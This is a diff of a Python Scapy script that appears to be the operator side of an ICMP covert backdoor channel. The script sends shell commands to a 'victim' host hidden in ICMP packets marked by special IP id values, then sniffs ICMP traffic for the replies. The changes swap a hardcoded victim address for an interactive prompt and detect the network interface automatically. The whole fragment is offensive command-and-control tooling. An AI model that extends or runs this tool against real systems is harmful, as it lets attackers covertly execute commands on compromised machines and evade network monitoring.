@@ -6,10 +6,12 @@ import threading
 from time import sleep
 
 # Modify below vars as needed
-VICTIM_IP = "10.42.2.15"
-IF_NAME = "enp0s3" # ens160 also common
+def get_IF_NAME():
+    tokens = popen("ip route | grep default", 'r').read().split(" ")
+    return tokens[tokens.index("dev")+1]
 
-SRC_IP = popen("ip -4 addr show " + IF_NAME + " | awk '/inet /{print $2}' | cut -d'/' -f1").read().strip()
+
+SRC_IP = popen("ip -4 addr show " + get_IF_NAME() + " | awk '/inet /{print $2}' | cut -d'/' -f1").read().strip()
 
 def send_command(victim_ip, command, force):
     pkt = IP(src=SRC_IP, dst=victim_ip, id=(6751 if not force else 31)) /\
@@ -28,9 +30,10 @@ def process_packet(packet):
             keep_sniffing = False
 
 def start_sniffing():
-    sniff(iface=IF_NAME, filter="icmp", prn=process_packet, store=0)
+    sniff(iface=get_IF_NAME(), filter="icmp", prn=process_packet, store=0)
 
 def main():
+    vic_ip = input("Victim: ")
     if len(argv) < 2 or argv[1] == "":
         print("Usage: ./script.py <command> [-f]")
         return
@@ -44,7 +47,7 @@ def main():
     sniffing_thread.start()
 
     # Send the command to the victim IP
-    send_command(VICTIM_IP, cmd, force)
+    send_command(vic_ip, cmd, force)
 
     # Wait until sniffing is complete
     while keep_sniffing:
